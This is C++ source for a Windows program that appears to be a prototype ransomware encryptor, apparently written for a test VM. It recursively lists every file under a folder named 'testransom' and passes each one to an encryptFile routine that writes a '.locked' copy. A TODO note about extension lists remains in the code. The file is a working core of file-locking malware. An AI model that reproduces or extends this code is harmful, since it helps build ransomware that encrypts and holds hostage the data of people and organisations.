#include "encryptor.h"
#include <shlwapi.h>
#include <queue>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

void CloseHandleLog(HANDLE h, const std::string& name) {
    ::CloseHandle(h);
    std::cerr << " [LOG] Handler <" << name << "> closed OK." << std::endl;
}

void FindFile(const std::wstring& directory, wstring ext, queue<wstring>& results)
{
    std::wstring tmp = directory + L"\\*";
    WIN32_FIND_DATAW file;
    HANDLE search_handle = FindFirstFileW(tmp.c_str(), &file);
    if (search_handle != INVALID_HANDLE_VALUE)
    {
        std::vector<std::wstring> directories;

        do
        {
            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if ((!lstrcmpW(file.cFileName, L".")) || (!lstrcmpW(file.cFileName, L"..")))
                    continue;
            }

            tmp = directory + L"\\" + std::wstring(file.cFileName);
            wcout << tmp << endl;
            if (!(file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) && PathMatchSpecW(file.cFileName, ext.c_str())) {
                //wcout << "pushed " << tmp.c_str() << endl;
                results.push(tmp);
            }

            if (file.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
                directories.push_back(tmp);
        } while (FindNextFileW(search_handle, &file));

        FindClose(search_handle);

        for (std::vector<std::wstring>::iterator iter = directories.begin(), end = directories.end(); iter != end; ++iter)
            FindFile(*iter, ext, results);

        //std::wcout << tmp << std::endl;
    }
}
//params: <input file> <output file> <is decrypt mode> <key>
int wmain(int argc, wchar_t* argv[])
{
    /*
    if (argc < 4) {
        printf("params: <input file> <output file> <is decrypt mode> [*key]\n");
        system("pause");
        return 0;
    }*/

    const wchar_t* filename = L"c:\\users\\vagrant\\Desktop\\important.txt";
    const wchar_t* filename2 = L"c:\\users\\vagrant\\Desktop\\important.locked";

    wstring directoryPath2 = L"C:\\Users\\vagrant\\Desktop\\testransom";
    queue<wstring> results;
    // TODO: list of extensions
    FindFile(directoryPath2, L"", results);

    wstring el;
    cout << "popping" << endl;
    while (results.size()) {
        el = results.front();

        wcout << "ciphering " << el.c_str() << endl;
        wcout << "ciphering " << (el + L".locked").c_str() << endl;
        encryptFile(el.c_str(), (el + L".locked").c_str(), false);

        results.pop();
        wcout << el << endl;
    }

    cout << "queue ready" << endl;
    cout << "number of el " << results.size() << endl;
    return 0;
}
